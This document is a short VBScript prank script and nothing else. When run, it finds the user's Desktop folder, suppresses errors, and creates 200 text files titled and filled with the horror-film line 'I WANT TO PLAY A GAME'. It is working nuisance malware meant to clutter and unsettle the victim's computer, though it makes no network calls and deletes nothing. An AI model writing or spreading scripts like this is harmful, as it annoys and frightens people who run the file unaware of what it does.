set x = createobject("Wscript.shell")
set c = createobject("Scripting.filesystemobject")
on error resume next
dim dsk : dsk=x.specialfolders("DESKTOP")
for nexfil=1 to 200
set p=c.CreateTextFile(""&dsk&"\I WANT TO PLAY A GAME                  "&nexfil&".txt")
p.write"I WANT TO PLAY A GAME!"
p.close
next